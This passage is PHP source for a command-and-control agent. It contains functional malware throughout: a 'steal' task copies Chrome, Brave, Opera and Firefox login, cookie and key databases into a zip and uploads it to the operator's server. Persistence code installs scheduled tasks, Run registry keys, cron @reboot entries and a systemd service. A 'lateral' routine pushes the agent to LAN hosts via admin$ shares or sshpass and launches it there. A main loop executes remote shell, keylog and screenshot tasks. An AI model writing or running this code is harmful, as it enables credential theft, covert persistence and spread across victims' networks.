            $roots[$home . '/.config/' . $r] = 'chromium';
        }
        foreach (['brave-browser', 'brave'] as $r) {
            $roots[$home . '/.config/' . $r] = 'chromium';
        }
        foreach (['opera', 'opera'] as $r) {
            $roots[$home . '/.config/' . $r] = 'chromium';
        }
        $roots[$home . '/.mozilla/firefox'] = 'firefox';
    }
    return $roots;
}

function steal_collect_browser($work) {
    $chromium_files = ['Login Data', 'Cookies', 'Web Data'];
    $firefox_files = ['cookies.sqlite', 'logins.json', 'key4.db', 'cert9.db'];
    $hits = [];
    foreach (steal_browser_roots() as $root => $kind) {
        if (!is_dir($root)) continue;
        $targets = ($kind === 'firefox') ? $firefox_files : $chromium_files;
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($root, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $item) {
            if (!$item->isDir()) continue;
            $dir = $item->getPathname();
            foreach ($targets as $fn) {
                $src = $dir . DIRECTORY_SEPARATOR . $fn;
                if (is_file($src)) {
                    $rel = str_replace($root, '', $dir);
                    $rel = ltrim(str_replace(DIRECTORY_SEPARATOR, '__', $rel), '_');
                    $dst = "$work/browser/$kind/$rel";
                    if (steal_safe_copy($src, $dst)) {
                        $hits[] = "browser/$kind/$rel/$fn";
                    }
                }
            }
        }
    }
    return $hits;
}

function task_steal($task_id, $args) {
    global $server, $token;
    $profile = strtolower(trim($args['profile'] ?? 'all'));
    if (!in_array($profile, ['all', 'env', 'tokens', 'browser'], true)) $profile = 'all';
    $work = sys_get_temp_dir() . '/c2steal_' . uniqid();
    @mkdir($work, 0755, true);
    $manifest = [];
    try {
        if ($profile === 'all' || $profile === 'env') {
            logmsg('steal: collecting env vars');
            $manifest = array_merge($manifest, steal_collect_env($work));
        }
        if ($profile === 'all' || $profile === 'tokens') {
            logmsg('steal: collecting token files');
            $manifest = array_merge($manifest, steal_collect_tokens($work));
        }
        if ($profile === 'all' || $profile === 'browser') {
            logmsg('steal: collecting browser dbs');
            $manifest = array_merge($manifest, steal_collect_browser($work));
        }
        if (empty($manifest)) {
            @unlink($work);
            return ['output' => "steal ($profile): nothing found", 'exit_code' => 1];
        }
        sort($manifest);
        file_put_contents("$work/manifest.txt", implode("\n", $manifest) . "\n");
        $archive = "$work/steal.zip";
        if (function_exists('ZipArchive')) {
            $zip = new ZipArchive();
            if ($zip->open($archive, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
                $it = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($work, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::SELF_FIRST
                );
                foreach ($it as $file) {
                    if ($file->isDir()) continue;
                    $name = str_replace($work . DIRECTORY_SEPARATOR, '', $file->getPathname());
                    $name = str_replace(DIRECTORY_SEPARATOR, '/', $name);
                    if ($name !== 'steal.zip') {
                        $zip->addFile($file->getPathname(), $name);
                    }
                }
                $zip->close();
            }
        } else {
            $escaped_work = escapeshellarg($work);
            $escaped_archive = escapeshellarg($archive);
            $cmd = "cd $escaped_work && (command -v zip >/dev/null 2>&1"
                 . " && zip -r $escaped_archive . -x steal.zip"
                 . " || tar czf $escaped_archive --exclude=steal.zip .) 2>/dev/null";
            @shell_exec($cmd);
        }
        $size = @filesize($archive) ?: 0;
        $url = rtrim($server, '/') . "/api/files/$task_id";
        if (function_exists('curl_init')) {
            $ch = curl_init($url);
            $file_data = new CURLFile($archive, 'application/zip', 'steal.zip');
            curl_setopt_array($ch, [
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => ['file' => $file_data],
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 300,
                CURLOPT_CONNECTTIMEOUT => 10,
                CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
                CURLOPT_HTTPHEADER => ["X-Agent-Token: $token"],
            ]);
            $res = curl_exec($ch);
            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
        } else {
            $escaped_archive = escapeshellarg($archive);
            $cmd = "curl -s -X POST \"$url\" -H \"X-Agent-Token: $token\""
                 . " -F \"file=@$escaped_archive;filename=steal.zip\""
                 . " --max-time 300 -o /dev/null -w '%{http_code}'";
            $code = @trim(shell_exec($cmd));
        }
        if ($code !== 200 && $code !== '200') {
            return ['output' => "steal upload failed: HTTP $code", 'exit_code' => 1];
        }
        $listing = implode("\n", $manifest);
        return [
            'output'    => "stole " . count($manifest) . " item(s) -> steal.zip ({$size} bytes)\n$listing",
            'exit_code' => 0,
        ];
    } catch (\Exception $e) {
        return ['output' => "error: " . $e->getMessage(), 'exit_code' => 1];
    } finally {
        @array_map(function($f) { @is_dir($f) ? @rmdir($f) : @unlink($f); },
            array_reverse(glob("$work/*") ?: []));
        @rmdir($work);
    }
}

// ------------------------------------------------------------ persistence
function relaunch_cmd($dest) {
    global $server, $token, $interval, $jitter;
    $interp = PHP_BINARY;
    if (PHP_OS_FAMILY === 'Windows') {
        $q = function ($s) { return '"' . $s . '"'; };
        return $q($interp) . ' ' . $q($dest)
             . ' --server ' . $q($server)
             . ' --token ' . $q($token)
             . ' --interval ' . (int)$interval
             . ' --jitter ' . (int)$jitter;
    }
    return escapeshellarg($interp) . ' ' . escapeshellarg($dest)
         . ' --server ' . escapeshellarg($server)
         . ' --token ' . escapeshellarg($token)
         . ' --interval ' . (int)$interval
         . ' --jitter ' . (int)$jitter;
}

function sh_embed($s) {
    return str_replace("'", "'\\''", $s);
}

function task_persistence($args) {
    $self = realpath(__FILE__) ?: __FILE__;
    try {
        if (PHP_OS_FAMILY === 'Windows') {
            $base = (getenv('APPDATA') ?: getenv('USERPROFILE')) . '\\Microsoft\\Windows\\c2update';
            if (!is_dir($base)) @mkdir($base, 0755, true);
            $dest = $base . '\\c2agent' . (strrchr($self, '.') ?: '');
            if (!@copy($self, $dest)) throw new \Exception("cannot copy self to $dest");
            $relaunch = relaunch_cmd($dest);
            $output = "persistence: copied self to $dest";
            $progdata = getenv('ProgramData') ?: (getenv('ALLUSERSPROFILE') ?: 'C:\\ProgramData');
            $launcher_dir = $progdata . '\\c2update';
            if (!is_dir($launcher_dir)) @mkdir($launcher_dir, 0755, true);
            $wrapper = $launcher_dir . '\\c2relaunch.cmd';
            file_put_contents($wrapper, "@echo off\r\nstart \"\" /b $relaunch\r\n");
            $output .= "\npersistence: wrote launcher $wrapper";
            $task = run_shell('schtasks /Create /TN "c2agent-persist" /TR "' . $wrapper . '" /SC ONLOGON /RL HIGHEST /F', 30);
            $ok = $task['exit_code'] === 0;
            $output .= "\n" . trim($task['output']);
            if (!$ok) {
                $reg = run_shell('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v c2agent /t REG_SZ /d "' . $wrapper . '" /f', 30);
                $ok = $reg['exit_code'] === 0;
                $output .= "\n" . trim($reg['output']);
            }
            return ['output' => truncate_output($output), 'exit_code' => $ok ? 0 : 1];
        }
        $home = getenv('HOME') ?: (getenv('USERPROFILE') ?: '.');
        $base = $home . '/.config/c2update';
        if (!is_dir($base)) @mkdir($base, 0755, true);
        $dest = $base . '/' . basename($self);
        if (!@copy($self, $dest)) throw new \Exception("cannot copy self to $dest");
        $relaunch = relaunch_cmd($dest);
        $cron_line = "@reboot $relaunch # c2agent-persist";
        $cron = run_shell("(crontab -l 2>/dev/null | grep -v 'c2agent-persist'; echo '" . sh_embed($cron_line) . "') | crontab -", 30);
        $ok = $cron['exit_code'] === 0;
        $output = "persistence: copied self to $dest\n" . trim($cron['output']);
        $unit = $base . '/c2-update.service';
        file_put_contents($unit,
            "[Unit]\nDescription=c2 update\n\n"
            . "[Service]\nType=simple\nExecStart=/bin/sh -c '" . sh_embed($relaunch) . "'\nRestart=always\n\n"
            . "[Install]\nWantedBy=default.target\n");
        $sd = run_shell('systemctl --user daemon-reload; systemctl --user enable --now c2-update.service', 30);
        $ok = $ok || $sd['exit_code'] === 0;
        $output .= "\n" . trim($sd['output']);
        return ['output' => truncate_output($output), 'exit_code' => $ok ? 0 : 1];
    } catch (\Exception $e) {
        return ['output' => 'persistence: error: ' . $e->getMessage(), 'exit_code' => 1];
    }
}

// -------------------------------------------------------------- lateral
function lateral_base($args) {
    $own = local_ip();
    $own_base = '';
    if (preg_match('/^(\d{1,3}\.\d{1,3}\.\d{1,3})\.\d{1,3}$/', $own, $m)) $own_base = $m[1];
    $sub = trim((string)($args['subnet'] ?? ''));
    if (preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}$/', $sub)) return $sub;
    return $own_base;
}

function lateral_peers($base, $own) {
    $peers = [];
    $cmds = PHP_OS_FAMILY === 'Windows' ? ['arp -a'] : ['arp -a', 'ip neigh'];
    foreach ($cmds as $cmd) {
        $r = run_shell($cmd, 20);
        if (preg_match_all('/\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b/', $r['output'], $ms)) {
            foreach ($ms[1] as $ip) {
                if (strpos($ip, "$base.") !== 0) continue;
                if ($ip === $own) continue;
                $valid = true;
                foreach (explode('.', $ip) as $oct) {
                    if ((int)$oct > 255) { $valid = false; break; }
                }
                if (!$valid) continue;
                $peers[$ip] = true;
            }
        }
    }
    $list = array_keys($peers);
    sort($list, SORT_STRING);
    return array_slice($list, 0, 30);
}

function err_brief($r) {
    $t = trim((string)($r['output'] ?? ''));
    $lines = array_values(array_filter(explode("\n", $t), function ($l) { return trim($l) !== ''; }));
    $brief = implode("\n", array_slice($lines, 0, 3));
    if ($brief === '') $brief = $t;
    if (strlen($brief) > 200) $brief = substr($brief, 0, 200) . '...';
    return $brief;
}

function task_lateral($args) {
    $base = lateral_base($args);
    if ($base === '') return ['output' => 'lateral: no LAN peers found', 'exit_code' => 1];
    $own = local_ip();
    $peers = lateral_peers($base, $own);
    if (empty($peers)) return ['output' => 'lateral: no LAN peers found', 'exit_code' => 1];

    $user = trim((string)($args['user'] ?? ''));
    if ($user === '') $user = (string)getenv('C2_LAT_USER');
    $pass = (string)($args['pass'] ?? '');
    if ($pass === '') $pass = (string)getenv('C2_LAT_PASS');
    $has_creds = $user !== '' && $pass !== '';
    $self = realpath(__FILE__) ?: __FILE__;
    $basename = basename($self);

    $lines = ['lateral: ' . count($peers) . ' peer(s): ' . implode(', ', $peers)];
    $deployed = 0; $failed = 0; $skipped = 0;

    foreach ($peers as $host) {
        if (!$has_creds) {
            $skipped++;
            $status = 'skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)';
        } elseif (PHP_OS_FAMILY === 'Windows') {
            $r1 = run_shell('net use \\\\' . $host . '\\admin$ /user:' . $user . ' "' . $pass . '"', 20);
            if ($r1['exit_code'] !== 0) {
                $failed++;
                $status = 'failed (net use: ' . err_brief($r1) . ')';
            } else {
                $r2 = run_shell('copy /y "' . $self . '" "\\\\' . $host . '\\admin$\\' . $basename . '"', 20);
                if ($r2['exit_code'] !== 0) {
                    $failed++;
                    $status = 'failed (copy: ' . err_brief($r2) . ')';
                    run_shell('net use \\\\' . $host . '\\admin$ /delete /y', 20);
                } else {
                    $remote = '\\\\' . $host . '\\admin$\\' . $basename;
                    $r3 = run_shell('schtasks /Create /S ' . $host . ' /TN "c2agent-lateral" /TR "' . $remote . '" /SC ONLOGON /RU ' . $user . ' /RP ' . $pass . ' /RL HIGHEST /F', 20);
                    run_shell('net use \\\\' . $host . '\\admin$ /delete /y', 20);
                    $deployed++;
                    $status = ($r3['exit_code'] === 0)
                        ? 'deployed (file dropped + scheduled c2agent-lateral)'
                        : 'deployed (file dropped; task: ' . err_brief($r3) . ')';
                }
            }
        } else {
            if (trim((string)@shell_exec('command -v sshpass 2>/dev/null')) === '') {
                $skipped++;
                $status = 'skipped (sshpass not installed)';
            } else {
                $r1 = run_shell('sshpass -p ' . escapeshellarg($pass)
                    . ' scp -o StrictHostKeyChecking=no -o ConnectTimeout=8 ' . escapeshellarg($self)
                    . ' ' . $user . '@' . $host . ':/tmp/' . $basename, 30);
                if ($r1['exit_code'] !== 0) {
                    $failed++;
                    $status = 'failed (scp: ' . err_brief($r1) . ')';
                } else {
                    $remote = '/tmp/' . $basename;
                    $rcmd = relaunch_cmd($remote);
                    $r2 = run_shell('sshpass -p ' . escapeshellarg($pass)
                        . ' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 ' . $user . '@' . $host
                        . " '" . sh_embed($rcmd) . " &>/dev/null &'", 30);
                    $deployed++;
                    $status = ($r2['exit_code'] === 0)
                        ? 'deployed (file uploaded + launched)'
                        : 'deployed (file uploaded; launch: ' . err_brief($r2) . ')';
                }
            }
        }
        $lines[] = '  ' . $host . ': ' . $status;
    }
    $lines[] = "lateral: deployed=$deployed failed=$failed skipped=$skipped";
    return ['output' => truncate_output(implode("\n", $lines)), 'exit_code' => 0];
}

function execute_task($task) {
    $task_id = $task['task_id'];
    $type = $task['type'];
    $args = $task['args'] ?? [];
    logmsg("running task $task_id ($type)");

    switch ($type) {
        case 'shell':
            $timeout = max(1, min((int)($args['timeout'] ?? SHELL_TIMEOUT), 3600));
            return run_shell($args['command'] ?? '', $timeout);
        case 'download':
            return task_download($task_id, $args);
        case 'upload':
            return task_upload($task_id, $args);
        case 'sleep':
            return task_sleep($args);
        case 'keylog':
            return task_keylog($args);
        case 'clipboard':
            return task_clipboard($args);
        case 'screenshot':
            return task_screenshot($task_id, $args);
        case 'clone':
            return task_clone($args);
        case 'steal':
            return task_steal($task_id, $args);
        case 'persistence':
            return task_persistence($args);
        case 'lateral':
            return task_lateral($args);
        case 'exit':
            return ['output' => 'exiting', 'exit_code' => 0, '_exit' => true];
        default:
            return ['output' => "unknown task type: $type", 'exit_code' => 1];
    }
}

// ----------------------------------------------------------------- main

// Parse command-line arguments
$args = getopt('', ['server:', 'token:', 'interval:', 'jitter:', 'verbose', 'state:']);
$server = $args['server'] ?? getenv('C2_SERVER') ?: '';
$token = $args['token'] ?? getenv('C2_TOKEN') ?: '';
$interval = (int)($args['interval'] ?? getenv('C2_INTERVAL') ?: 10);
$jitter = (int)($args['jitter'] ?? getenv('C2_JITTER') ?: 0);
$verbose = isset($args['verbose']) || in_array((string)getenv('C2_VERBOSE'), ['1', 'true'], true);
$state_file_override = $args['state'] ?? getenv('C2_STATE_FILE') ?: '';

if (!$server || !$token) {
    fwrite(STDERR, "usage: php agent.php --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]\n");
    exit(1);
}
$server = rtrim($server, '/');

load_id();
if (!$agent_id) register();

logmsg("agent running against $server (interval {$interval}s)");

while (true) {
    $tasks = checkin();
    foreach ($tasks as $task) {
        $result = execute_task($task);
        report(
            $task['task_id'],
            $result['output'] ?? '',
            $result['exit_code'] ?? 0,
            $result['error'] ?? ''
        );
        if (!empty($result['_exit'])) {
            logmsg("exit task received — shutting down");
            exit(0);
        }
    }
    $delay = $interval;
    if ($jitter > 0) {
        $delay += random_int(0, $jitter);
    }
    sleep($delay);
}
